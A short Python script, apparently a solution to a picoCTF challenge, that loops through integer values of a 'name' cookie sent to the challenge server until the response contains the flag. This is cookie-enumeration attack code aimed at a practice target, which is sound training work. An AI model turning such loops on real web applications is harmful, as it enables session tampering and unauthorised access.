import requests


url = "http://mercury.picoctf.net:29649/check"
count = 1

while True:
    cookies = dict(name=str(count))
    rs = requests.get(url, cookies=cookies)
    if "picoCTF" in rs.text:
        print(rs.text)
        break
    count += 1